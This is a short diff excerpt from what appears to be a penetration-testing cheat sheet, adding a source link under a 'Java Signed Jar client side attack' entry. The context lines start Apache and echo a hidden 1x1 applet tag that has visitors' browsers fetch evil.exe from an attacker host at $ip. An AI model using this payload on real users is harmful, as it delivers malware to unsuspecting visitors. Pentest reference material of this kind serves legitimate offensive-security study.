@@ -1614,6 +1614,7 @@ Client, Web and Password Attacks
         service apache2 start
 
     -   JAVA Signed Jar client side attack  
+        https://github.com/KhitMinnyo/JavaApplet/blob/master/JaAp.java
         echo '<applet width="1" height="1" id="Java Secure"
         code="Java.class" archive="SignedJava.jar"><param name="1"
         value="http://$ip:80/evil.exe"></applet>' >
